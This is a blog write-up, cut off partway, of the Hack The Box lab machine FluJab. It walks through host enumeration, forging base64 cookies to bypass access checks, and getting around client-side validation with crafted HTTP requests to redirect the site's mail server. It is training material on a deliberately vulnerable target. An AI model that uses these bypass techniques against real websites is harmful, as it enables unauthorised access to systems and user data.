<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - FluJab - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-FluJab"><a href="#Hack-The-Box-FluJab" class="headerlink" title="Hack The Box - FluJab"></a>Hack The Box - FluJab</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys today FluJab retired and here’s my write-up about it. This machine had a lot of rabbit holes and trolls which made it hard to enjoy the machine. But without mentioning those annoying things this machine had some really cool web exploitation parts like cookie manipulation, authentication bypasses and most importantly an interesting <code>SQL</code> injection vulnerability. <code>Ajenti</code> administration panel was installed on the box and I could get credentials for it by exploiting the <code>SQLi</code>,  After that I could use a user’s public ssh key to get the private key as it was vulnerable to <code>CVE-2008-0166</code> then I escaped <code>rbash</code> and exploited a vulnerable version of <code>screen</code> to get a root shell. It’s a Linux box and its ip is <code>10.10.10.124</code>, I added it to <code>/etc/hosts</code> as <code>flujab.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/flujab/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services :<br><code>nmap -sV -sT -sC flujab.htb</code><br><img src="/images/hackthebox/flujab/1.png" alt=""><br><img src="/images/hackthebox/flujab/2.png" alt=""><br>We got <code>ssh</code> on port 22, <code>http</code> on ports 80 and 8080 and <code>https</code> on port 443. There’s also some sort of virtual hosting as we can see from the <code>nmap</code> scan and there are a lot of domains …<br>We can also check the <code>ssl</code> certificate manually :<br><img src="/images/hackthebox/flujab/3.png" alt=""><br><img src="/images/hackthebox/flujab/4.png" alt=""><br><img src="/images/hackthebox/flujab/5.png" alt=""></p>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>I added all of them to <code>/etc/hosts</code> and checked them, However I will skip the rabbit holes in the write-up because it’s just a waste of time. If we take a look at what we have :<br><img src="/images/hackthebox/flujab/6.png" alt=""><br>The machine name is <code>flujab</code> so we are only interested in :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">console.flujab.htb</span><br><span class="line">sys.flujab.htb</span><br><span class="line">smtp.flujab.htb</span><br><span class="line">freeflujab.htb</span><br><span class="line">flujab.htb</span><br></pre></td></tr></table></figure>
<p>We saw that error about direct ip access when we visited <code>flujab.htb</code>, Let’s check the other 4.<br><code>console.flujab.htb</code> :<br><img src="/images/hackthebox/flujab/7.png" alt=""><br>Just a troll !<br><code>sys.flujab.htb</code> :<br><img src="/images/hackthebox/flujab/8.png" alt=""><br>The same error on <code>flujab.htb</code><br><code>smtp.flujab.htb</code> :<br><img src="/images/hackthebox/flujab/9.png" alt=""><br>We don’t have any credentials for that.<br><code>freeflujab.htb</code> :<br><img src="/images/hackthebox/flujab/10.png" alt=""><br><img src="/images/hackthebox/flujab/11.png" alt=""><br><img src="/images/hackthebox/flujab/12.png" alt=""><br><img src="/images/hackthebox/flujab/13.png" alt=""><br><img src="/images/hackthebox/flujab/14.png" alt=""><br>That one is interesting. I tried to run <code>gobuster</code> but there was a wildcard response. When I checked manually I found that instead of responding with <code>404</code> it responds with a redirection to <code>https://clownware.htb/cwerror_pages.php</code> which has a <code>gif</code> of a strange creepy clown …<br>Note : I checked them all on port 8080 too but I always got the direct ip access error.<br>I started <code>burp</code> and configured the scope :<br><img src="/images/hackthebox/flujab/15.png" alt=""><br><img src="/images/hackthebox/flujab/16.png" alt=""><br><img src="/images/hackthebox/flujab/17.png" alt=""><br>Then I ran the spider :<br><img src="/images/hackthebox/flujab/18.png" alt=""><br>Results :<br><img src="/images/hackthebox/flujab/19.png" alt=""><br><img src="/images/hackthebox/flujab/20.png" alt=""><br><img src="/images/hackthebox/flujab/21.png" alt=""><br>I checked the requests and the responses of different pages and actions. I noticed in one of the responses a <code>Set-Cookie</code> header that sets a cookie called <code>Modus</code> and sets the path for it to <code>/?smtp_config</code>.<br><img src="/images/hackthebox/flujab/22.png" alt=""><br>I requested <code>/?smtp_config</code> in the browser and looked at the request in <code>burp</code> :<br>Request :<br><img src="/images/hackthebox/flujab/23.png" alt=""><br>Response :<br><img src="/images/hackthebox/flujab/24.png" alt=""><br>The response was a redirection to <code>/?denied</code>. We are sending 3 cookies in every request : <code>Modus</code> , <code>Patient</code> and <code>Registered</code>. <code>Modus</code> and <code>Registered</code> are <code>base-64</code> encoded strings while <code>Patient</code> is an <code>md5</code> hash.<br><img src="/images/hackthebox/flujab/25.png" alt=""><br><code>Modus</code> = <code>Configure=Null</code><br><code>Registered</code>  = <code>f991b5fb6a2939471c7230b2db78225e=Null</code><br><code>Registered</code> is using the same hash from <code>Patient</code>, After some guesses I found that this hash is for my ip :<br><img src="/images/hackthebox/flujab/26.png" alt=""><br>Anyway we can try to change these values from <code>Null</code> to <code>True</code> and see what happens :<br><img src="/images/hackthebox/flujab/27.png" alt=""><br><img src="/images/hackthebox/flujab/28.png" alt=""><br>Request :</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?smtp_config</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: freeflujab.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
<p>Response :</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Thu, 15 Jun 2019 10:34:17 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Server</span>: ClownWare Proxy</span><br><span class="line"><span class="attribute">Content-Length</span>: 3735</span><br></pre></td></tr></table></figure>
<p>Great, we can access the page now.<br><img src="/images/hackthebox/flujab/31.png" alt=""><br>Before doing anything I noticed this message about the whitelist:<br><img src="/images/hackthebox/flujab/32.png" alt=""><br><img src="/images/hackthebox/flujab/33.png" alt=""><br>I requested <code>/?whitelist</code> and looked at the response :<br><img src="/images/hackthebox/flujab/34.png" alt=""><br><img src="/images/hackthebox/flujab/35.png" alt=""><br>My ip wasn’t there. Anyway I used python to run a debugging <code>smtp</code> server :<br><code>python -m smtpd -n -c DebuggingServer 10.10.xx.xx:25</code><br><img src="/images/hackthebox/flujab/36.png" alt=""><br>Then I went to update the <code>smtp</code> settings and add mine :<br><img src="/images/hackthebox/flujab/37.png" alt=""><br>But I got this message : <code>A Valid SMTP Domain Address Is Required</code>. So I checked the source of the form :</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"?smtp_config"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row aln-center"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-6 "</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"mailserver"</span> <span class="attr">id</span>=<span class="string">"email-server"</span> <span class="attr">value</span>=<span class="string">"smtp.flujab.htb"</span> <span class="attr">pattern</span>=<span class="string">"smtp.[A-Za-z]&#123;1,255&#125;.[A-Za-z]&#123;2,5&#125;"</span> <span class="attr">title</span>=<span class="string">" A Valid SMTP Domain Address Is Required"</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"port"</span> <span class="attr">id</span>=<span class="string">"port"</span> <span class="attr">placeholder</span>=<span class="string">"25"</span> <span class="attr">value</span>=<span class="string">"25"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-12"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">			WARNING: Only <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/?whitelist"</span>&gt;</span>whitelisted sysadmins<span class="tag">&lt;/<span class="name">a</span>&gt;</span> are authorized to </span><br><span class="line">			access this page! <span class="tag">&lt;<span class="name">br</span> \&gt;</span> If you are not supposed to </span><br><span class="line">			change these settings then don't! whitelist will be </span><br><span class="line">			auto-updated.</span><br><span class="line">		<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"actions"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"style1"</span> <span class="attr">value</span>=<span class="string">"Save Mail Server Config"</span> <span class="attr">name</span>=<span class="string">"save"</span> /&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>It’s relying on client-side validation check :<br><img src="/images/hackthebox/flujab/39.png" alt=""><br>Which means that we can bypass it easily by sending the data directly in the request :<br>Request :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?smtp_config</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: freeflujab.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 59</span><br><span class="line"></span><br><span class="line">mailserver=10.10.xx.xx&amp;port=25&amp;save=Save+Mail+Server+Config</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/flujab/41.png" alt=""><br><img src="/images/hackthebox/flujab/42.png" alt=""><br>Note : I checked <code>/?whitelist</code> again and my ip was added there after I added it in the <code>smtp</code> server configuration<br>In the patients section there were some pages to book an appointment (<code>/?book</code>), send a reminder (<code>/?remind</code>) or to cancel an appointment (<code>/?cancel</code>). To book an appointment we need a valid patient’s name. After some enumeration I found some names in <code>/?info</code> :<br><img src="/images/hackthebox/flujab/43.png" alt=""><br>I took B. Smith and after some guesses I got the right name which was Bob Smith :<br><img src="/images/hackthebox/flujab/44.png" alt=""><br><img src="/images/hackthebox/flujab/45.png" alt=""><br>The email was sent and we can see that in the python <code>smtp</code> server :<br><img src="/images/hackthebox/flujab/46.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">---------- MESSAGE FOLLOWS ----------                                                                                                       </span><br><span class="line">Date: Thu, 13 Jun 2019 14:47:23 +0100                                                                                                       </span><br><span class="line">To: bobsmith1975@gmail.com                                                                                                                  </span><br><span class="line">From: Nurse Julie &lt;DutyNurse@flujab.htb&gt;</span><br><span class="line">Subject: Flu Jab Appointment - Ref:NHS-943-475-5911</span><br><span class="line">Message-ID: &lt;e1f9b14325c78abda96f5dd82694b7a4@freeflujab.htb&gt;</span><br><span class="line">X-Mailer: PHPMailer 5.2.22 (https:&#x2F;&#x2F;github.com&#x2F;PHPMailer&#x2F;PHPMailer)</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;iso-8859-1</span><br><span class="line">X-Peer: 10.10.10.124</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Dear Mr Bob Smith,</span><br><span class="line"></span><br><span class="line">  Here are the details of your appointment at our surgery.</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">    VACCINATION</span><br><span class="line">    Routine Priority</span><br><span class="line">    ------------------</span><br><span class="line">    REF    : NHS-943-475-5911</span><br><span class="line">    Code   : Influ-022</span><br><span class="line">    Type   : Injection</span><br><span class="line">    Time   : 09:00</span><br><span class="line">    Date   : 2018-11-30</span><br><span class="line">    LOC    : Crick026</span><br><span class="line">  ________________________</span><br><span class="line"></span><br><span class="line">  We look forward to seeing you.</span><br><span class="line">  Have a nice day,</span><br><span class="line"></span><br><span class="line">  Nurse Julie Walters</span><br><span class="line">  Senior Staff Nurse</span><br><span class="line">  Cricklestone Doctors Surgery</span><br><span class="line">  NHS England.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------ END MESSAGE ------------</span><br></pre></td></tr></table></figure>
<p>I tried to go to <code>/?cancel</code> :<br>Request :</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?cancel</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: freeflujab.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
<p>Response :</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Date</span>: Thu, 13 Jun 2019 13:50:05 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Location</span>: /?ERROR=NOT_REGISTERED</span><br><span class="line"><span class="attribute">Server</span>: ClownWare Proxy</span><br><span class="line"><span class="attribute">Content-Length</span>: 2060</span><br></pre></td></tr></table></figure>
<p>It redirected me to <code>/?ERROR=NOT_REGISTERED</code>. I looked at the older requests and I noticed the <code>Set-Cookie</code> headers :<br><img src="/images/hackthebox/flujab/49.png" alt=""><br>So I added the info about expiration, max age and path to my cookies and tried again :<br>Request :</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?cancel</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: freeflujab.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: Modus=Q29uZmlndXJlPVRydWU%3d; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/?smtp_config; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQ%3D%3D; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
<p>Response :</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Thu, 13 Jun 2019 13:58:23 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Server</span>: ClownWare Proxy</span><br><span class="line"><span class="attribute">Content-Length</span>: 5128</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/flujab/52.png" alt=""><br><img src="/images/hackthebox/flujab/53.png" alt=""><br>To cancel an appointment we need to provide the NHS number of the patient. However like on the <code>smtp</code> configuration page it used client-side validation check :</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"nhsnum"</span> <span class="attr">placeholder</span>=<span class="string">"NHS Number Required"</span> <span class="attr">pattern</span>=<span class="string">"NHS-\d&#123;3&#125;-\d&#123;3&#125;-\d&#123;4&#125;"</span> <span class="attr">title</span>=<span class="string">" A Valid NHS Number Is Required e.g. NHS-012-345-6789"</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"actions"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"style1"</span> <span class="attr">value</span>=<span class="string">"Cancel Appointment"</span> <span class="attr">name</span>=<span class="string">"submit"</span> /&gt;</span><span class="tag">&lt;/<span 